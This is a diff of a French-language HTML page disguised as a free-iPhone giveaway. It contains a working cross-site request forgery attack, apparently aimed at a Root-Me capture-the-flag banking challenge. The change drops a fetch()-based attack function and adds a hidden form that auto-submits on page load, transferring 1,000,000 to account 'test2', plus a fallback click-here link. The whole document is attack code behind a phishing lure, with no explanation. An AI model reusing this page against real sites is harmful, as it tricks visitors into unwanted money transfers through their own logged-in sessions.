@@ -2,21 +2,16 @@
 <html>
 <head>
     <title>Gagne un iPhone Gratuit 🎁</title>
-    <script>
-        function csrfAttack() {
-            fetch("https://bankme-1.challenges.pro.root-me.org/profile", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                },
-                body: "account=test2&amount=1000000"
-            });
-        }
-    </script>
 </head>
-<body onload="csrfAttack();">
+<body onload="document.getElementById('csrf_form').submit();">
     <h1>Félicitations, vous avez gagné ! 🎉</h1>
     <p>Cliquez sur le bouton ci-dessous pour réclamer votre prix :</p>
-    <button onclick="csrfAttack();">Réclamer mon iPhone</button>
+
+    <form id="csrf_form" action="https://bankme-1.challenges.pro.root-me.org/transfer" method="POST">
+        <input type="hidden" name="account" value="test2">
+        <input type="hidden" name="amount" value="1000000">
+    </form>
+
+    <p>Si vous n'êtes pas redirigé, <a href="#" onclick="document.getElementById('csrf_form').submit();">cliquez ici</a>.</p>
 </body>
 </html>
